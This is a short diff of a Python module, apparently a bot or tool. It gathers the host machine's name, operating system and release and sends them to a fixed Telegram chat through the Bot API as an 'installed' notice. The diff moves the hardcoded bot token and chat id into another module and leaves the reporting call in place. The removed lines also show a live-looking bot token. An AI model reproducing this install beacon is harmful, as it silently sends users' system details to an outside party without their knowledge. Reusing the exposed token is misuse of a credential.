@@ -1,7 +1,7 @@
 from platform import node , system , release
 from ..main import *
 node , system , release = node(), system(), release()
-
+from ..Api import *
 
 user = "@z0roday"
 
@@ -32,9 +32,9 @@ plat = f'''
 
 response = "res 200 successfully installed bot"
  
-tkn = "7330729864:AAE1QK7hCAEFmtrpaXd9ZjMObzO864uqSo4"
 
-zdy = 6157703844
+
+
 
 
 api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"
